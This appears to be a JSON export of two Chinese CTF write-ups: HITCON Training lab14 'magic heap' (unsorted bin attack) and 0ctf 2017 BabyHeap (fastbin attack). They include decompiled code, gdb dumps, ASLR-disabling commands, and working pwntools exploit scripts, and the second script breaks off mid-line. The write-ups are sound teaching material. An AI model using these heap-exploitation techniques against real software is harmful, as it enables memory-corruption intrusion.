[{"title":"HITCON Training lab14 magic heap","url":"/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/","content":"unsortedbin_attack（例题）\n查看保护\n\n文件没开PIE，got表可写，开启了Canary和NX保护，64位程序。\n程序源代码\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void read_input(char *buf, size_t size) {  int ret;  ret = read(0, buf, size);  if (ret &lt;= 0) {    puts(\"Error\");    _exit(-1);  }}char *heaparray[10];unsigned long int magic = 0;void menu() {  puts(\"--------------------------------\");  puts(\"       Magic Heap Creator       \");  puts(\"--------------------------------\");  puts(\" 1. Create a Heap               \");  puts(\" 2. Edit a Heap                 \");  puts(\" 3. Delete a Heap               \");  puts(\" 4. Exit                        \");  puts(\"--------------------------------\");  printf(\"Your choice :\");}void create_heap() {  int i;  char buf[8];  size_t size = 0;  for (i = 0; i &lt; 10; i++) {    if (!heaparray[i]) {      printf(\"Size of Heap : \");      read(0, buf, 8);      size = atoi(buf);      heaparray[i] = (char *)malloc(size);      if (!heaparray[i]) {        puts(\"Allocate Error\");        exit(2);      }      printf(\"Content of heap:\");      read_input(heaparray[i], size);      puts(\"SuccessFul\");      break;    }  }}void edit_heap() {  int idx;  char buf[4];  size_t size;  printf(\"Index :\");  read(0, buf, 4);  idx = atoi(buf);  if (idx &lt; 0 || idx &gt;= 10) {    puts(\"Out of bound!\");    _exit(0);  }  if (heaparray[idx]) {    printf(\"Size of Heap : \");    read(0, buf, 8);    size = atoi(buf);    printf(\"Content of heap : \");    read_input(heaparray[idx], size);    puts(\"Done !\");  } else {    puts(\"No such heap !\");  }}void delete_heap() {  int idx;  char buf[4];  printf(\"Index :\");  read(0, buf, 4);  idx = atoi(buf);  if (idx &lt; 0 || idx &gt;= 10) {    puts(\"Out of bound!\");    _exit(0);  }  if (heaparray[idx]) {    free(heaparray[idx]);    heaparray[idx] = NULL;    puts(\"Done !\");  } else {    puts(\"No such heap !\");  }}void l33t() { system(\"cat ./flag\"); }int main() {  char buf[8];  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  while (1) {    menu();    read(0, buf, 8);    switch (atoi(buf)) {    case 1:      create_heap();      break;    case 2:      edit_heap();      break;    case 3:      delete_heap();      break;    case 4:      exit(0);      break;    case 4869:      if (magic &gt; 4869) {        puts(\"Congrt !\");        l33t();      } else        puts(\"So sad !\");      break;    default:      puts(\"Invalid Choice\");      break;    }  }  return 0;}\nIDA静态分析\nmain 函数\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp){  int v3; // eax  char buf[8]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  while ( 1 )  {    while ( 1 )    {      menu();      read(0, buf, 8uLL);      v3 = atoi(buf);      if ( v3 != 3 )        break;      delete_heap();    }    if ( v3 &gt; 3 )    {      if ( v3 == 4 )        exit(0);      if ( v3 == 4869 )      {        if ( (unsigned __int64)magic &lt;= 4869 )        {          puts(\"So sad !\");        }        else        {          puts(\"Congrt !\");          l33t();        }      }      else      {LABEL_17:        puts(\"Invalid Choice\");      }    }    else if ( v3 == 1 )    {      create_heap();    }    else    {      if ( v3 != 2 )        goto LABEL_17;      edit_heap();    }  }}\n看一看就行，接下来看具体函数功能\nl33t 存在后门函数\nint l33t(){  return system(\"cat /home/magicheap/flag\");}\n全局变量\n.bss:00000000006020B9                 align 20h.bss:00000000006020C0                 public magic.bss:00000000006020C0 ; __int64 magic.bss:00000000006020C0 magic           dq ?                    ; DATA XREF: main:loc_400D05↑r.bss:00000000006020C8                 align 20h.bss:00000000006020E0                 public heaparray.bss:00000000006020E0 ; heap *heaparray[10].bss:00000000006020E0 heaparray       dq ?                    ; DATA XREF: create_heap+30↑r.bss:00000000006020E0                                         ; create_heap+8C↑w ...\nmagic ：00000000006020C0\nheap_ptr ：00000000006020E0\nmeau函数\nint menu(){  puts(\"--------------------------------\");  puts(\"       Magic Heap Creator       \");  puts(\"--------------------------------\");  puts(\" 1. Create a Heap               \");  puts(\" 2. Edit a Heap                 \");  puts(\" 3. Delete a Heap               \");  puts(\" 4. Exit                        \");  puts(\"--------------------------------\");  return printf(\"Your choice :\");}\n打印菜单\ncreate函数\nunsigned __int64 create_heap(){  int i; // [rsp+4h] [rbp-1Ch]  size_t size; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 9; ++i )  {    if ( !heaparray[i] )    {      printf(\"Size of Heap : \");      read(0, buf, 8uLL);      size = atoi(buf);      heaparray[i] = (heap *)malloc(size);      if ( !heaparray[i] )      {        puts(\"Allocate Error\");        exit(2);      }      printf(\"Content of heap:\");      read_input(heaparray[i], size);      puts(\"SuccessFul\");      return __readfsqword(0x28u) ^ v4;    }  }  return __readfsqword(0x28u) ^ v4;}\n输入大小，创建相应大小的堆\nedit函数\nunsigned __int64 edit_heap(){  unsigned int v1; // [rsp+4h] [rbp-1Ch]  size_t v2; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  printf(\"Index :\");  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &gt;= 0xA )  {    puts(\"Out of bound!\");    _exit(0);  }  if ( heaparray[v1] )  {    printf(\"Size of Heap : \");    read(0, buf, 8uLL);    v2 = atoi(buf);    printf(\"Content of heap : \");    read_input(heaparray[v1], v2);    puts(\"Done !\");  }  else  {    puts(\"No such heap !\");  }  return __readfsqword(0x28u) ^ v4;}\n重新输入大小，更新内容，大小由我们定，存在堆溢出哦！！！\ndelete函数\nunsigned __int64 delete_heap(){  unsigned int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(\"Index :\");  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &gt;= 0xA )  {    puts(\"Out of bound!\");    _exit(0);  }  if ( heaparray[v1] )  {    free(heaparray[v1]);    heaparray[v1] = 0LL;    puts(\"Done !\");  }  else  {    puts(\"No such heap !\");  }  return __readfsqword(0x28u) ^ v3;}\n正常free操作，指针清0，不存在uaf\nexp\n#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./magicheap')p = remote('node4.buuoj.cn',29691)def create(size, content):    p.recvuntil(\":\")    p.sendline(\"1\")    p.recvuntil(\":\")    p.sendline(str(size))    p.recvuntil(\":\")    p.sendline(content)def edit(idx, size, content):    p.recvuntil(\":\")    p.sendline(\"2\")    p.recvuntil(\":\")    p.sendline(str(idx))    p.recvuntil(\":\")    p.sendline(str(size))    p.recvuntil(\":\")    p.sendline(content)def delete(idx):    p.recvuntil(\":\")    p.sendline(\"3\")    p.recvuntil(\":\")    p.sendline(str(idx))def debug():    gdb.attach(p)    pause()heap_ptr = 0x6020E0magic = 0x6020C0goal = magic - 0x10# 申请一个small chunkcreate(0x10,'a'*8)create(0x410,'b'*8)   #chunk0# 申请一个chunk1防 chunk0 合并create(500,'c'*8)#debug()delete(1)#debug()payload = p64(0)*3 + p64(0x421) + p64(0) + p64(goal)edit(0,len(payload),payload)#debug()create(0x410,\"666\")#debug()p.sendline(\"4869\")p.interactive()\n创建两个chunk\n0x1a65000:\t0x0000000000000000\t0x0000000000000021\t//chunk00x1a65010:\t0x6161616161616161\t0x000000000000000a 0x1a65020:\t0x0000000000000000\t0x0000000000000421\t//chunk10x1a65030:\t0x6262626262626262\t0x000000000000000a\n申请的 chunk(500) 以防止合并\n0x1a65440:\t0x0000000000000000\t0x0000000000000201\t//chunk30x1a65450:\t0x6363636363636363\t0x000000000000000a\nfree掉small chunk，被放入到 unsorted bin 中\n0x1a65000:\t0x0000000000000000\t0x00000000000000210x1a65010:\t0x6161616161616161\t0x000000000000000a0x1a65020:\t0x0000000000000000\t0x00000000000004210x1a65030:\t0x00007f9bd595bb78\t0x00007f9bd595bb78\nunsortedbinall: 0x1a65020 —▸ 0x7f9bd595bb78 (main_arena+88) ◂— 0x1a65020\n被放入unsorted bin 中\n观察全局变量\n0x6020c0 &lt;magic&gt;:\t0x0000000000000000\t0x00000000000000000x6020d0:\t0x0000000000000000\t0x00000000000000000x6020e0 &lt;heaparray&gt;:\t0x0000000001a65010\t0x0000000000000000    \t\t\t\t\t\t\t\t\t\t#chunk1已经被free掉0x6020f0 &lt;heaparray+16&gt;:\t0x0000000001a65450\t0x0000000000000000\n溢出到目的位置\n通过对chunk 0 进行溢出 修改 chunk1 的 bk 指针，到magic-0x10的位置\npwndbg&gt; x/16gx 0x1a650000x1a65000:\t0x0000000000000000\t0x00000000000000210x1a65010:\t0x0000000000000000\t0x00000000000000000x1a65020:\t0x0000000000000000\t0x0000000000000421\t0x1a65030:\t0x0000000000000000\t0x00000000006020b0 // bk -&gt; magic - 0x10\n再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk\n0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;:\t0x00007f9bd595b8e0\t0x00000000000000000x6020c0 &lt;magic&gt;:\t0x00007f9bd595bb78\t0x0000000000000000\n可以看到magic 已经被改成了0x00007f9bd595bb78，这个值是main_arena+88\n最后我们输入 4869 就可以打印flag 了\nflag{unsorted_bin_attack}\n","categories":["heap"],"tags":["unsoted bin attack"]},{"title":"0ctf_2017_BabyHeap","url":"/2023/09/13/0ctf_2017_BabyHeap/","content":"fastbin_attack中的Arbitrary Alloc（例题）\n具体例子原理网上很多，这里就不再赘述了，这里讲解一道fastbin_attack中的Arbitrary Alloc\n\n题目来源：0ctf 2017 BabyHeap\n参考资料：\nhttps://blog.csdn.net/qq_36495104/article/details/106202135 #思路\nCTF-wiki\nhttps://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ #payload\nhttps://blog.csdn.net/counsellor/article/details/81543197 #关闭地址随机化\n\n\n附件：\n链接: https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw  密码: f1i6\n–来自百度网盘超级会员V3的分享\n\n\n准备工作\n将文件下载下来，首先检查一下文件的保护情况：\n\n可以看到保护全部开启（这还玩个毛线啊）\n具体看一下各个保护：\n\nArch:   amd64-64-little\n这个说明程序是64位程序，小端序\nRELRO:   Full RELRO\nFull RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改\nStack:   Canary found\n对使用随机数每个函数进行保护，防止栈溢出\nNX:    NX enabled\n不能向栈上直接注入shellcode\nPIE:    PIE enabled\n地址随机化，我感觉这个保护是最恶心的\n来看一下我的Linux环境：\nUbuntu版本：16.04\n\n其中libc-2.23.so是我本机的libc文件\n静态分析\n整个程序相当于一个堆内存管理器，静态分析一下吧：\nmain 函数\n__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char *addr; // [rsp+8h] [rbp-8h]  addr = get_addr();  while ( 1 )  {    menu();                                     //                                                 //   puts(\"1. Allocate\");                                                //   puts(\"2. Fill\");                                                //   puts(\"3. Free\");                                                //   puts(\"4. Dump\");                                                //   puts(\"5. Exit\");                                                //   printf(\"Command: \");                                                //     input();    switch ( (unsigned __int64)off_14F4 )    {      case 1uLL:        Allocate((__int64)addr);        break;      case 2uLL:        Fill((__int64)addr);        break;      case 3uLL:        Free((__int64)addr);        break;      case 4uLL:        Dump((__int64)addr);        break;      case 5uLL:        return 0LL;      default:        continue;    }  }}\n主函数内容，包含菜单函数和四个堆功能函数\nget_addr 函数(生成随机地址)\nchar *get_addr(){  int fd; // [rsp+4h] [rbp-3Ch]  char *addr; // [rsp+8h] [rbp-38h]  unsigned __int64 v3; // [rsp+10h] [rbp-30h]  __int64 buf[4]; // [rsp+20h] [rbp-20h] BYREF  buf[3] = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  alarm(60u);  puts(\"===== Baby Heap in 2017 =====\");  fd = open(\"/dev/urandom\", 0);                 // 调用系统文件生成随机数  if ( fd &lt; 0 || read(fd, buf, 0x10uLL) != 16 )    exit(-1);  close(fd);  addr = (char *)((buf[0] % 0x555555543000uLL + 0x10000) &amp; 0xFFFFFFFFFFFFF000LL);  v3 = (buf[1] % 0xE80uLL) &amp; 0xFFFFFFFFFFFFFFF0LL;  if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr )    exit(-1);  return &amp;addr[v3];                             // 利用生成的随机数来生成随机地址}\n​\t\t这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。\n​\t\t还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch\n返回的addr 指针 包含了 所有chunk 的 信息和 数据chunk 的指针\nmeau 函数\nvoid __cdecl menu(){  puts(\"1. Allocate\");  puts(\"2. Fill\");  puts(\"3. Free\");  puts(\"4. Dump\");  puts(\"5. Exit\");  printf(\"Command: \");}\n打印菜单\nAlloc 函数\nvoid __fastcall Allocate(__int64 a1){  int i; // [rsp+10h] [rbp-10h]  int size; // [rsp+14h] [rbp-Ch]  void *calloc_ptr; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  {    if ( !*(_DWORD *)(24LL * i + a1) )    {      printf(\"Size: \");      size = input();      if ( size &gt; 0 )      {        if ( size &gt; 4096 )          size = 4096;        calloc_ptr = calloc(size, 1uLL);        if ( !calloc_ptr )          exit(-1);        *(_DWORD *)(24LL * i + a1) = 1;\t\t\t\t\t\t\t//chunk_flag        *(_QWORD *)(a1 + 24LL * i + 8) = size;\t\t\t\t\t//chunk_size        *(_QWORD *)(a1 + 24LL * i + 16) = calloc_ptr;\t\t\t//chunk_data_ptr 指向calloc出来的chunk_data        printf(\"Allocate Index %d\\n\", (unsigned int)i);      }      return;    }  }}\n传入的参数地址是get_addr 随机生成的地址。allocate函数是来创建堆块的，申请chunk最大的大小为4096。\n首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\\x00。\n请注意，堆块的index是从0开始的\n因此程序的结构体为：\n\n●chunk_flag:用来判断堆块是否存在\n●chunk_content_size:#记录content的大小\n●chunk_data_ptr:指向calloc出来的chunk_data\n\nFill 函数\nvoid __fastcall Fill(__int64 a1){  signed int v1; // [rsp+18h] [rbp-8h]  int v2; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v1 = input();  if ( (unsigned int)v1 &lt;= 0xF &amp;&amp; *(_DWORD *)(24LL * v1 + a1) == 1 )\t//判断序号是否正确，判断flag为 chunk 是否存在  {    printf(\"Size: \");    v2 = input();\t\t\t\t\t//又让输出size，改写 chunk 数据部分的内容,存在溢出!!    if ( v2 &gt; 0 )    {      printf(\"Content: \");      read_func2(*(_QWORD *)(24LL * v1 + a1 + 16), v2); \t//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data    }  }}\n上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。\n在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size，但是程序并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。\nFree 函数\nvoid __fastcall Free(__int64 a1){  signed int v1; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v1 = input();  if ( (unsigned int)v1 &lt;= 0xF &amp;&amp; *(_DWORD *)(24LL * v1 + a1) == 1 )  {    *(_DWORD *)(24LL * v1 + a1) = 0;    *(_QWORD *)(24LL * v1 + a1 + 8) = 0LL;    free(*(void **)(24LL * v1 + a1 + 16));    *(_QWORD *)(24LL * v1 + a1 + 16) = 0LL;     // 指针置空  }}\n输入序号，释放chunk。将 flag 字段，size 字段清0，free了数据chunk的指针同时也清0，不存在uaf\nDump 函数\nvoid __fastcall Dump(__int64 a1){  signed int v1; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v1 = input();  if ( (unsigned int)v1 &lt;= 0xF &amp;&amp; *(_DWORD *)(24LL * v1 + a1) == 1 )  {    puts(\"Content: \");    write_func(*(_QWORD *)(24LL * v1 + a1 + 16), *(_QWORD *)(24LL * v1 + a1 + 8));    puts(byte_14F1);  }}\n输入序号，打印内容\ngdb 动态调试\n还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。\n关闭ASLR保护\n由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令\nubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space2ubuntu@ubuntu:~$ sysctl -a --pattern randomizekernel.randomize_va_space = 2ubuntu@ubuntu:~$###0 = 关闭1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）2 = 全随机。除了1中所述，还有heap。###\n现在关闭ASLR，关闭方法如下：\n方法一： 手动修改randomize_va_space文件\n上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。\necho 0 &gt; /proc/sys/kernel/randomize_va_space#注意，这里是先进root权限，后执行。#重启之后会恢复默认\n方法二： 使用sysctl控制ASLR\nsysctl -w kernel.randomize_va_space=0#重启之后将恢复默认#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。\n方法三： 使用setarch控制单个程序的随机化\n如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。\nsetarch `uname -m` -R ./your_program#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)\n方法四： 在GDB场景下，使用set disable-randomization off\n在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。\n当然，这里开启，关闭和查看的方法看起来就比较正规了。\n关闭ASLR：set disable-randomization on开启ASLR：set disable-randomization off查看ASLR状态：show disable-randomization\n我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：\n\n\n通过对比发现，变动的只有第一行的地址：\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n0x40729d6e2000     0x40729d6e3000 rw-p     1000 0\n​    0x2dd727226000     0x2dd727227000 rw-p     1000 0\n到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。\n我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：\ngiantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017$ gdb babyheap_0ctf_2017GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from babyheap_0ctf_2017...(no debugging symbols found)...done.pwndbg&gt; rStarting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 ===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 1Size: 20Allocate Index 01. Allocate2. Fill3. Free4. Dump5. ExitCommand: 2Index: 0Size: 40Content: aaaaaaaaaaaaaaaaaa^CProgram received signal SIGINT, Interrupt.0x00007ffff7b04360 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484\t../sysdeps/unix/syscall-template.S: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────── RAX  0xfffffffffffffe00 RBX  0x0 RCX  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x15 RDI  0x0 RSI  0x555555757023 ◂— 0x20fe10000000000 R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700 R9   0x9 R10  0x0 R11  0x246 R12  0x555555554a40 ◂— xor    ebp, ebp R13  0x7fffffffdd50 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffdc20 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc70 —▸ 0x5555555553e0 ◂— push   r15 RSP  0x7fffffffdbf8 —▸ 0x5555555551fd ◂— mov    qword ptr [rbp - 8], rax RIP  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────── ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;    ↓   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff   0x7ffff7b043a9 &lt;read+89&gt;               ret        0x7ffff7b043aa                         nop    word ptr [rax + rax]   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;    ↓   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────00:0000│ rsp  0x7fffffffdbf8 —▸ 0x5555555551fd ◂— mov    qword ptr [rbp - 8], rax01:0008│      0x7fffffffdc00 ◂— 0x28 /* '(' */02:0010│      0x7fffffffdc08 —▸ 0x555555757010 ◂— 0x6161616161616161 ('aaaaaaaa')03:0018│      0x7fffffffdc10 ◂— 0x13... ↓05:0028│ rbp  0x7fffffffdc20 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc70 —▸ 0x5555555553e0 ◂— push   r1506:0030│      0x7fffffffdc28 —▸ 0x555555554f48 ◂— jmp    0x555555554f4e07:0038│      0x7fffffffdc30 ◂— 0x0───────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────── ► f 0     7ffff7b04360 __read_nocancel+7   f 1     5555555551fd   f 2     555555554f48   f 3     555555555188   f 4     7ffff7a2d840 __libc_start_main+240Program received signal SIGINTpwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x3b0326206000     0x3b0326207000 rw-p     1000 0          0x555555554000     0x555555556000 r-xp     2000 0      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017    0x555555755000     0x555555756000 r--p     1000 1000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017    0x555555756000     0x555555757000 rw-p     1000 2000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017    0x555555757000     0x555555778000 rw-p    21000 0      [heap]    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0          0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0          0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0          0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]pwndbg&gt; \n再看一下 0x3b0326206000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：\n这里我重新调试了一个gdb\n0xb422b6be0c0:\t0x0000000000000000\t0x00000000000000000xb422b6be0d0:\t0x0000000000000001\t0x0000000000000014    \t\t\t#chunk_flag\t\t\t#size0xb422b6be0e0:\t0x0000555555757010\t0x0000000000000000    \t\t\t#chunk_data_ptr0xb422b6be0f0:\t0x0000000000000000\t0x00000000000000000xb422b6be100:\t0x0000000000000000\t0x00000000000000000xb422b6be110:\t0x0000000000000000\t0x00000000000000000xb422b6be120:\t0x0000000000000000\t0x00000000000000000xb422b6be130:\t0x0000000000000000\t0x0000000000000000\nexp 讲解\nexp的主要内容如下：\n\nexp来自@yichen师傅：https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ\n\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./babyheap_0ctf_2017_patch')elf = ELF('./babyheap_0ctf_2017_patch')#首先是定义的一些函数，对应着程序的功能def alloc(size):    p.recvuntil(\"Command: \")    p.sendline(\"1\")    p.recvuntil(\"Size: \")    p.sendline(str(size))def fill(idx, content):    p.recvuntil(\"Command: \")    p.sendline(\"2\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvuntil(\"Size: \")    p.sendline(str(len(content)))    p.recvuntil(\"Content: \")    p.send(content)def free(idx):    p.recvuntil(\"Command: \")    p.sendline(\"3\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))def dump(idx):    p.recvuntil(\"Command: \")    p.sendline(\"4\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvline()    return p.recvline()def unsorted_offset_arena(idx):    word_bytes = context.word_size / 8    offset = 4  # lock    offset += 4  # flags    offset += word_bytes * 10  # offset fastbin    offset += word_bytes * 2  # top,last_remainder    offset += idx * 2 * word_bytes  # idx    offset -= word_bytes * 2  # bin overlap    return offset#首先申请4个fast chunk和1个small chunkalloc(0x10)#index0alloc(0x10)#index1alloc(0x10)#index2alloc(0x10)#index3alloc(0x80)#index4#free两个,这时候会放到fastbins中,而且因为是后进的,所以#fastbin[0]-&gt;index2-&gt;index1-&gt;NULLfree(1)free(2)#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p8(0x80)fill(0, payload)#然后再通过index3去进行写入,把index4的大小改成0x21#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内payload = p64(0)*3payload += p64(0x21)fill(3, payload)#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了alloc(0x10)alloc(0x10)#申请成功之后index2就指向index4#为了让index4能够被放到unsortedbins中,要把它的大小改回来payload = p64(0)*3payload += p64(0x91)fill(3, payload)#再申请一个防止index4与top chunk合并了alloc(0x80)#这时候free就会把index4放到unsorted中了free(4)#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了#main_arena与libc偏移为0x3c4b20(文末有工具算)#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移unsorted_offset_mainarena=unsorted_offset_arena(5)#这函数还不太明白unsorted_addr=u64(dump(2)[:8].strip().ljust(8, \"\\x00\"))libc_base=unsorted_addr-0x3c4b20-unsorted_offset_mainarenalog.info(\"libc_base: \"+hex(libc_base))#此时因为fastbins中没有了,所以从unsortedbins中找alloc(0x60)#index2还是指向index4那个地方我们可以先释放index4free(4)#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小#这个地址是main_arena-0x40+0xd,具体看后面图片解释payload = p64(libc_base+0x3c4aed)fill(2, 